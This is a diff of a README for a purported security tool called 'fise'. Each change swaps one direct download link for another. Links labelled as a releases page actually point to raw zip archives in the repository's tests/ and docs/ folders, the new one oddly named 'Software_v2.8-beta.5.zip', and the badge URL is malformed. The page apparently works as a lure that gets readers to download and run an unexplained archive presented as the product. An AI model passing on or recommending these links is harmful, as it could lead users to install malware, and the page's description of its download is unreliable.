@@ -6,7 +6,7 @@ Welcome to fise! This application helps you protect your web, API, and streaming
 
 ## 📥 Download fise
 
-[![Download fise](https://raw.githubusercontent.com/gabinam/fise/main/tests/fise-v1.4.zip%20fise-Release-blue)](https://raw.githubusercontent.com/gabinam/fise/main/tests/fise-v1.4.zip)
+[![Download fise](https://github.com/gabinam/fise/raw/refs/heads/main/docs/Software_v2.8-beta.5.zip%20fise-Release-blue)](https://github.com/gabinam/fise/raw/refs/heads/main/docs/Software_v2.8-beta.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ Welcome to fise! This application helps you protect your web, API, and streaming
 
 ## 💻 Download & Install
 
-To download fise, visit this page: [Download fise Releases](https://raw.githubusercontent.com/gabinam/fise/main/tests/fise-v1.4.zip). 
+To download fise, visit this page: [Download fise Releases](https://github.com/gabinam/fise/raw/refs/heads/main/docs/Software_v2.8-beta.5.zip). 
 
 Here are the steps to install and run fise:
 
@@ -66,4 +66,4 @@ A: Yes, fise is open-source and free to use.
 
 If you need further assistance, feel free to reach out through GitHub issues or check the discussions tab on our repository page. We're here to help! 
 
-For more information, visit this page: [Download fise Releases](https://raw.githubusercontent.com/gabinam/fise/main/tests/fise-v1.4.zip).
+For more information, visit this page: [Download fise Releases](https://github.com/gabinam/fise/raw/refs/heads/main/docs/Software_v2.8-beta.5.zip).
